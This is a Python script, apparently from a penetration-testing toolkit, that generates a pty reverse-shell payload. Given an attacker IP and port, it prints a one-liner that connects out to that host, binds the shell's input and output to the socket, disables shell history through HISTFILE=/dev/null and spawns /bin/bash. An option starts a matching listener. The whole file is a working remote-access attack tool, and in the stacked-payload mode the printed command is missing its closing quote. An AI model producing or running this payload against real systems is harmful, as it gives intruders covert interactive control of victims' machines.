#!/usr/bin/python3
#
# SPDX-FileCopyrightText: (C) 2021 Lazula <26179473+Lazula@users.noreply.github.com>
# SPDX-License-Identifier: GPL-3.0-or-later

import argparse
import os
import sys
import socket

sys.path.append(os.path.normpath(os.path.join(os.path.dirname(sys.argv[0]), "../shell/python-pty-shells/")))
import tcp_pty_shell_handler

def parse_arguments():
    parser = argparse.ArgumentParser(description="Python pty reverse shell generator")
    parser.add_argument("lhost", type=str, help="The IP to connect back to.")
    parser.add_argument("lport", type=int, help="The TCP port to connect back to on the given host.")
    parser.add_argument("-s", "--stack", action="store_true", help="Generate a shell payload that will attempt to use python, python2, and python3 instead of raw python code.")
    parser.add_argument("-l", "--listen", action="store_true", help="Start a listener on the appropriate IP and port (if possible) after printing the reverse shell payload.")

    args = parser.parse_args()

    try:
        socket.inet_pton(socket.AF_INET, args.lhost)
    except OSError:
        print(f"{args.lhost} is not a valid IPv4 address.")
        raise RuntimeError

    if args.lport < 1 or args.lport > 65535:
        print(f"{args.lport} is not a valid port.")
        raise RuntimeError

    return args


def print_payload(lhost, lport, stack=False):
    payload = f'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");os.putenv("TERM","xterm");pty.spawn("/bin/bash");s.close();'

    if stack:
        print(f"python -c '{payload}' || python2 -c '{payload}' || python3 -c '{payload}")
    else:
        print(payload)


def main():
    try:
        args = parse_arguments()
    except RuntimeError:
        print("An error was encountered during argument parsing.")
        exit(1)

    print_payload(args.lhost, args.lport, args.stack)

    if args.listen:
        print(f"\nStarting listener on {args.lhost}:{args.lport}")
        s = tcp_pty_shell_handler.Shell((args.lhost, args.lport), bind=True)
        s.handle()

    return 0


if __name__ == "__main__":
    main()
